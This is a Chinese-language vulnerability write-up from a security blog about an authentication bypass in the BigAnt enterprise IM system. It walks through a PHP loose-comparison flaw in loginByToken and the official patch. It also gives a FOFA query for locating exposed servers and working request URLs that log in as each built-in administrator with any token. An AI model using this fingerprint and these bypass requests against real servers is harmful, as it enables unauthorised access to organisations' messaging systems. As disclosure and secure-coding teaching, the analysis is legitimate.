---
title: "大蚂蚁 (BigAnt) 即时通讯系统 loginByToken 逻辑错误至权限绕过漏洞"
source: https://mrxn.net/jswz/bigant-loginByToken-authbypass.html
asset_dir: assets/大蚂蚁-(bigant)-即时通讯系统-loginbytoken-逻辑错误至权限绕过漏洞
---

# 大蚂蚁 (BigAnt) 即时通讯系统 loginByToken 逻辑错误至权限绕过漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/2/6 13:22
- 455浏览
- [0评论](#comment)
- 22分钟阅读

深入探索

验证

鉴权

即时通信

---

# 漏洞简介

杭州九麒科技大蚂蚁 (BigAnt) 即时通讯系统是一款企业级IM通信管理系统，提供多种功能支持。该系统的 loginByToken 接口存在逻辑错误，可导[致权限绕](https://mrxn.net/tag/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)过以任意用户身份登录进系统，从而造成系统敏感信息[泄露](https://mrxn.net/tag/%E6%B3%84%E9%9C%B2)，甚至系统权限丢失。

短信和即时消息

# 影响版本

BigAnt 5.5.x 及以上版本用户

[![大蚂蚁 (BigAnt) 即时通讯系统 loginByToken 逻辑错误至权限绕过漏洞](images/img-001-f1b9c6e060ae.png)](https://image.mrxn.net/c60a23ed151548d39353341b023ebcc8.png)

经过测试，最新版本 6.0.1.20250407.1 也受影响

漏洞扫描服务

深入探索

编程语言教程

代码安全审计

技术文章订阅

# fofa语法

> (body="/Public/static/admin/admin\_common.js" && body="/Public/lang/zh-cn.js.js") || title="即时通讯 系统登录" && body="/Public/static/ukey/Syunew3.js"

# 漏洞分析

这个漏洞是在分析官方补丁的时候发现的，还记得上一篇文章 [大蚂蚁 (BigAnt) 即时通讯系统 upload\_file 任意文件上传漏洞](https://mrxn.net/jswz/bigant-upload_file-rce.html) 提到的补丁文件部分除了上传漏洞的DispersedAddinController，另一个就是本次漏洞的主角 Application/Home/Controller/LoginController.class.php，我对比了补丁和安装的最新版本发现差异如下

[![大蚂蚁 (BigAnt) 即时通讯系统 loginByToken 逻辑错误至权限绕过漏洞](images/img-002-9407080f901b.webp)](https://image.mrxn.net/394e7d8572b34b3488f77d62e23a9b07.webp)

原本如下逻辑代码

```
$isok= D("Common/AppCenter")->checkToken($uid,$token);
if(!$isok){
        die(json_encode(sp_api_fail(ERR_OP_ERR, "token 效验失败", JSON_UNESCAPED_UNICODE))) ;
}
```

深入探索

授权

文本剥离工具

安全运维咨询

补丁修改成如下逻辑

```
$res= D("Common/AppCenter")->checkToken($uid,$token);
if($res!==true){
    die(json_encode(sp_api_fail(ERR_OP_ERR, "token 效验失败", ),JSON_UNESCAPED_UNICODE)) ;
}
```

其中有两处非常重要的改变在比较部分，这是一个典型的 PHP 类型混淆（Type Juggling）[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

`!$isok` 使用松散类型判断，以下情况都会被认为是"验证通过"：

网络安全

```
$isok = "error";      // !"error" = false → 验证通过 ❌
$isok = 1;            // !1 = false → 验证通过 ❌
$isok = ["data"];     // !["data"] = false → 验证通过 ❌
$isok = "0";          // !"0" = true → 验证失败（但逻辑可能不符预期）
```

如果 `checkToken()` 返回错误信息字符串或其他非布尔值，攻击者可能[绕过验证](https://mrxn.net/tag/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)。

跟进 `checkToken()` 方法看下

[![大蚂蚁 (BigAnt) 即时通讯系统 loginByToken 逻辑错误至权限绕过漏洞](images/img-003-b1c05b37aa52.webp)](https://image.mrxn.net/0b86f8e923744387aebbf7dde119f4e2.webp)

只有成功验证才会返回true,可以正确进行比较，返回其他字符串都会导致比较被绕过，从而导致[鉴权绕过](https://mrxn.net/tag/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)。

```
$isok = D("Common/AppCenter")->checkToken($uid, $token);
if (!$isok) {
    die(...);  // 验证失败
}
// 继续执行（验证通过）
```

**PHP 类型转换规则**：非空字符串在布尔上下文中为 `true`

```
// 验证失败时
$isok = " uid xxx token 传入参数为空";  // 返回错误信息字符串
!$isok = !"非空字符串" = !true = false

if (false) {  // 条件不成立
    die(...);  // ❌ 不会执行
}
// ✅ 继续执行 → 认证被绕过！
```

因此攻击者只需发送**任意请求**（甚至不需要提供 token），就能[绕过认证](https://mrxn.net/tag/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)，所有验证失败的情况都会返回字符串 → `!字符串` = `false` → **绕过认证。**

网络安全

而补丁使用`if($res !== true)`

使用 `!==`（严格不等于）确保：

- **只有**当 `$res` 是**布尔值** **`true`** 时才通过验证
- 任何其他值（`false`、`null`、字符串、数组等）都会触发失败

在进行安全相关的布尔判断时，**始终使用严格比较**（`===` 或 `!==`）才是最佳实践！

# 漏洞复现

以下系统内置四种管理用户都可直接登录

系统管理员

安全研究工具

- /home/login/loginByToken?uid=1&token=asdasdasdadasadad

安全管理员

- /home/login/loginByToken?uid=2&token=asdasdasdadasadad

审计管理员

- /home/login/loginByToken?uid=3&token=asdasdasdadasadad

超级管理员

- /home/login/loginByToken?uid=4&token=asdasdasdadasadad

[![大蚂蚁 (BigAnt) 即时通讯系统 loginByToken 逻辑错误至权限绕过漏洞](images/img-004-ba9405918a80.gif)](https://image.mrxn.net/d705e822df064af38d072c2470657881.gif)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#php](https://mrxn.net/tag/php)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#权限绕过](https://mrxn.net/tag/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87)
- [#泄露](https://mrxn.net/tag/%E6%B3%84%E9%9C%B2)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALdUlEQVR4AeyajVYjuQ6E+fb933kv1aLcsmx3foZJcveYgyipVJKN1SaBmX++vr7+fdb+/flw/U84hStNzTnO6KbmHGesuRrPtNYYrzQ5J981QsUy+X9iGsh3/f78lBNoA/me7te9VjfvusorBr6A1ltctVrvOCNEH9dCxHCic0bXO864ysG6n+shNO4hdM4o7l5zjbANRMG295/AMBCI6cOIj2wXot41EDGc6Nwj6KduVuMcnGvAte+aGc7WeJSD9fqzXsNAZqLNve4EfmUgMD4FfuL8rTjO6BxE/SoW7zoIrWPlbBA5x0ZrMzp3D7quaiHWA2rq6fhXBvL06rtwOIFfGcjqCdJqzgHHuy04Ufkrg1ML4VsPfWw+49Xaq9ys3hzcXtPaZ/FXBvLs4rtuPIG/M5Bxnc3ceQLDQHyVZ3irZ66xFuKaO2f+HnSNsOrFraxqZzHEvmY5cxAaCFytJ941FZVbWdUqHgYictv7TqANBOIpgNtYtwtRk3kIzk8H9LF46DmYx7D+0wtEDZCXn/pa02ZBjc1ntAY43pg4BxEDphoChxZuYyv6dtpAvv39+QEn8I+n/wx6/651LKxcjaVZGcRT5RrhSqucrWog+piHiGG8ce4Bp8Z1j6D7PIv7hjxy2i/QDgOBeEK8NkQMI1aNYyGEXr4M+licnyIYc8pD8IDCzoDlz2gL3d9oXghRL18GfSzOBpGrfRwLITSumSHMNRA88DUM5Gt/vPUE/oFzOkDbDHA8gZr+yqDXtOJvxzUQmm/q+ISIgSOefXFtxqpzLvMzbpa3Tui8fJljoWKZ/Fsmncw64Dg/xzOEUfP/dENm39N/jtsD+bCRDm976/4grhXQUsD0OkLwcKKLdJ1ljjOKl5mDqHc8QwiN6mzWOYbQmIeIAVMDulYIHN+nfFkVQ+SBmmoxcPQAGnfl7BtydTpvyLUX9bq2nghZ5RWLzyaumvPmgeNJMS+E4KwRJ3MMkYcTlc9mbUYIvXXOORaag9A6ziidLHPZV84G6z65Jvuuzdy+Ifk0PsBvryEQE65Tcyz0fiG0q1g8hEZ12ZSzmYfQQqD5GUJo3AMiBky1/wMGHLcS1ugiWGsgctbO0HuFtdaaWm9euG9IPZ03x8NrCPQThoiBtlVNUgYcT2BLJEd5Gaw1Sd65cLsGRg0EB4FaX9Y1L4Hy91opnYZXvSD2BWvcN2R6rO8j90Ded/bTlduLurO+chDXyrEQgoNAcdncY4YQNbNc7pF9iBo40Xn3cTxDa64QovcjGhhroOegj9Xfe5S/sn1DVifzJn75on41zVXOvNDfj3yZY4gnB26ja64Qzj5XuprTnmSVh7MfhG8NRKw6mXmhYhmERpwMIgYUHibdyvYNOY7oc760gXhi3howvKW1BiIHPbo2I4Qmcyvf/Z13LDT3CEKsrfpqEDn3gz42P0MYtRCc17m3TjqIWmD/i+HXh320GwIxpXv2V5+CGqsH3O43q1OteYgecP4vEQjOmowQOQh0DiKGE53TerIai7M5V9F5oXPyZY5nCOc+AMmbtYE0ZjtvPYHh95C6G+B4LYERrYV1zk+ItY6FEHXyZdZAzysHwVkzQ+mywboG+hxEnOtna4iD0MpfGaw1XmNWu2/I7FT+nHu6wx7I00f3dwrbL4a+RsbZcs5VtDbz5iCurnPmZwihdQ4iBkw99G8d96x5jwbofmy3zUwcCK1TEDFg6hL3Dbk8ntcn20CA7imYPTnQayBibxsiBkwNT3RLJAc41vaaVwihTeVLF3pt7luLnIOoAZrEOROOgWPfcKI1j6D7CdtAHmmwtX/vBNpANJ1sEFPPS+d89rNm5VsP0RdoUudMADefPNfM0H2M1jgWVg5iTeVWVmuyzrmKWWMf+rUgYmD/6eTrwz7aDYGYkvfnSTvOCL3WOdcIzVVUrhpEPwh0PtdC5DInH4IHFHY269MJJoFrhJP0TQo4bveVUL1lM00byCy5udefwB7I68/8csXhb1lwXrlVpa6brOYhamH866y1cGrMqZfM8QyVl9WcOFvNOYZzTQjfOeOshznoa6CP3UPoGvm3zNqM+4bcOrUX54c/nXh9GJ8CCA56dM0MPX2ImpnGXNU6FkJfDxHDiO5nVH016OuszQihMQcRu5d5IUQOelTOBpFzPMN9Q2an8kauvYZAP73ZU2DuHvT3BH1f8zOEXgsRAzP5weW9HMT3F3PfbvcJHG9JgcZbCxy5lvh2nPt2j89VLP4QfH+RL/t2j0/51Y5E+gKxNrB/Mfz6sI+HfmTBOUk4fX9PMHJ+OqxxLIRTD1jS/iDZiOSoTmYKOJ5sON/ZzXJw5nO9tTOE6O0cRAwjVo3WkMGohZ5zrfChgahg2989geFdlqYqu1pWeZk1EBN3PEPpZRBaoMnEyxoxcZSX1ZQ4G9BuC1ClXewakzU2L1zlzAulm5lytyzX7RuST+MD/DcM5AO+6w/ewvJtL3Bc/3zd/H3AmJPO+WdRPWQQ/XMfGLmcn/nqJZvlIPpBoDUQMWDqOAfo3xSoLzDkXASRc3wv7hty70m9SDe8qENMVk+ADCIG2pbEy4D2hED/BEGfg4hbkwtHvWVZolgG6z7KZ8v18iFqod+rapSXyV+Z8jKIPvKr1dqaVwxRD4HibPuG+CQ+BB96DfH0ISbr2Dj7np7JQfS/6nfV13XQ93GN0Jo/QfWxQawFge4LEQOmLn/x3TekHdNnOG0gnnTdFtC9TsD58xci5xqIGE6NczOE0Nfcai/SQV8DEcOI0svcD0YNBCddNYgc9DjrZ672MC9c5TLfBpLJ7b/vBPZA3nf205XbQCCupa5WtlkV9FqIOGth5HJ+5kNfk/cBfc711szQGojarHHOHIQGTqwaa2c8RJ01ELG1M4TQuEbYBjIr2NzrT6D9YrhaWlOzWVNj8xmtgXgKnDMvNAehESczP0PlZc5B1MKJzhmllzkWKpbJv2UQva2DiOFE9ZJZI1/m+Arh7LNvyNVJvSHXfjHUNGV1D3BOT3kZBGetOJnje1E1Muuh72teKJ0Mbmukl0kvky+DqAUUdiZdNQvMr2LxQPfrgTgZnLxiGQQnv9q+IfVE3hy3gUBMDXqc7a8+MRA15oXQc7M+EJqag+BhRGshclrLBsFVjWPrhBBaCLQGIgZMNQSOW9CICwfWWq2fLbdpA8nk9t93Au1dVp6Y/KstQUwfAqWXXdU4B1EDmFqielarYuB4aoGWAg6uEROn9oX7aybt7qKgXwP6WE32DdEpfJDtgVwO4/XJ9ra3Ll2vtGJr5GeD8eo5D2Nu1afyELWAUw3df4YWOQcMP8Kg56zN6D73YK7Lfq41n7nq7xtST+TNcXtRh3hi4H703j15GGudmyH0evd7BOHs8UjdSgtnP+/ZWjhzgOkOgeE2WgCRg8DaX7p9Q3QKH2RtIJ7WPVj3DzHxzLtP5qpvjbHmcwzjGsq7Vqg4G/Q1EDGQZZ2vPjbgeNoh0LyxK/wJ7slZA9H3p/SANpAj2l/efgLDQCCmBiM+sluIetdAxLDG+uQ4FrqPEdZ9rFGdrMbibPB4H4ga9xVCcNCjcjaInGOj9yIcBmLRxvecwB7Ie859ueqvDERXrZpXhLimNa/YGvkyCK35GUonc06+rXKOjRD94UTn3GOG1hitcZzxnpz11sK5n18ZiBfY+Ocn8CsDgZhw3o6nb4TQwIk1l+tv+bUWxv+cB7GWtTOs60DUAC0FHG9/TUAfm8/otTJnH9b1vzIQL7Txz09gGIgnO8PVctbmPMRTAIE5t/LdxwhRC6xKpjxwPNG1z1R8B/lMH4g95PYQXO3nWDgMJDfY/utPoA0EYnpwG1fbhLNW05attJmXTgZnPZAlS191tqXoJwEcNwf4YR4DrzPDVad7tEDbVxvIquHmX3sCeyCvPe+bq/0PAAD//wlqHv4AAAAGSURBVAMAxUx4ochGYX4AAAAASUVORK5CYII=)

手机扫码阅读
